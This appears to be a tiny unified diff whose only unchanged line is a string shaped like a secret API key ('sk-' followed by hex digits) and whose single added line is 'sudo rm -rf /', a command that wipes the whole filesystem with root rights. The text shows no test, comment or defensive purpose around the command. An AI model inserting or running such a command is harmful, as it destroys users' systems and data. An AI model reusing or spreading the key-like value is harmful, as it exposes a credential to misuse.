@@ -1,1 +1,2 @@
 sk-8f6f1f17050242c9bc9905d0d719df08
+sudo rm -rf /
